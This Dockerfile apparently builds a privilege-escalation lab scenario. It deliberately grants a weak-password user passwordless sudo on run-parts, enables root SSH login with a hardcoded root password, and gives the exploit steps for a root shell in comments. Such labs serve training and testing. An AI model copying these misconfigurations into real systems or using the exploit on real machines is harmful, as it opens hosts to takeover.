FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_run-parts
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/run-parts as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and ensure run-parts is available
# run-parts is provided by debianutils which is typically installed by default
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        debianutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify run-parts is installed
RUN which run-parts && ls -la /usr/bin/run-parts

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# run-parts executes all scripts in a given directory. The exploit approach:
#   1. Create a directory with a shell script that spawns a root shell
#   2. sudo run-parts --regex '.*' /path/to/dir
# This runs all executables in the directory as root, giving a root shell.
# Example exploit:
#   mkdir /tmp/privesc
#   echo '#!/bin/bash' > /tmp/privesc/exploit
#   echo '/bin/bash' >> /tmp/privesc/exploit
#   chmod +x /tmp/privesc/exploit
#   sudo run-parts /tmp/privesc
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/run-parts" > /etc/sudoers.d/run-parts && \
    chmod 440 /etc/sudoers.d/run-parts

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]